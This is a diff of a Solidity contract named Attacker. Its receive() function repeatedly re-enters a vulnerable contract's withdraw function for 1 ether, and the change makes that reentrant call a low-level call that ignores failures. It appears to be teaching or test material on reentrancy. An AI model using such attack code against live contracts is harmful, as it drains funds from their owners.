@@ -24,7 +24,13 @@ contract Attacker {
     receive() external payable {
         if (numCalls < maxCalls) {
             numCalls++;
-            vulnerableContract.withdraw(1 ether);
+            // Try to call withdraw and catch any errors
+            (bool success, ) = address(vulnerableContract).call(
+                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
+            );
+            if (!success) {
+                // Reentrant call failed, do nothing
+            }
         }
     }
 }
